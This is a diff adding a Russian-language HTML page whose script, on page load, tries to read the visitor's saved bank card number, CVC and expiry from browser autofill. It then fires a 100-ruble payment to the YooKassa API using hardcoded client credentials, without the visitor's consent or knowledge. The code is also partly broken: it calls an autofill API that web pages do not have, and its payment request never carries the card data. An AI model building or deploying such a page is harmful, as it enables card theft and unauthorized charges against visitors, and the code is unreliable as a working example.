@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Автоматическое заполнение данных банковской карты и перевод на ЮMoney</title>
+<script>
+const clientId = '5581FB9B4B6157FFD7EC30B7AC9921164C5C6A243E407A2FD2D7445F7B72EF1A';
+const clientSecret = '4794ADC072DBD80B2535FDCFB8427299E668274BC944E1D8CDFA8B6D715DB9814158B1D86AA4214FBB6EC53D3B67BBC4F50EC7020FE55AB29CB5EE422172D2A4';
+
+async function fillCardDetails() {
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cvcInput = document.getElementById('cvc');
+    const expirationDateInput = document.getElementById('expirationDate');
+
+    const credentials = await browser.autofill.getFormData();
+    if (credentials && credentials.cards && credentials.cards.length > 0) {
+        const card = credentials.cards[0];
+        cardNumberInput.value = card.number;
+        cvcInput.value = card.cvc;
+        expirationDateInput.value = card.expirationMonth + '/' + card.expirationYear;
+    }
+}
+
+async function transferMoney(amount) {
+    const response = await fetch('https://api.yookassa.ru/v3/payments', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': 'Basic ' + btoa(clientId + ':' + clientSecret)
+        },
+        body: JSON.stringify({
+            amount: {
+                value: amount,
+                currency: 'RUB'
+            },
+            payment_method_data: {
+                type: 'bank_card'
+            }
+        })
+    });
+
+    const payment = await response.json();
+    console.log('Перевод денег успешно выполнен. Payment ID:', payment.id);
+}
+
+window.addEventListener('load', function() {
+    fillCardDetails();
+    const amountInput = document.getElementById('amount');
+    amountInput.value = 100; // В рублях, предполагая, что валюта по умолчанию - рубль
+    transferMoney(amountInput.value);
+});
+</script>
+</head>
+<body>
+<h2>Автоматическое заполнение данных банковской карты и перевод на ЮMoney</h2>
+<form>
+    <label for="cardNumber">Номер карты:</label>
+    <input type="text" id="cardNumber" name="cardNumber" required><br><br>
+
+    <label for="cvc">CVC/CVV:</label>
+    <input type="text" id="cvc" name="cvc" required><br><br>
+
+    <label for="expirationDate">Срок годности (MM/YY):</label>
+    <input type="text" id="expirationDate" name="expirationDate" required><br><br>
+
+    <label for="amount">Сумма (в рублях):</label>
+    <input type="number" id="amount" name="amount" required><br><br>
+</form>
+</body>
+</html>
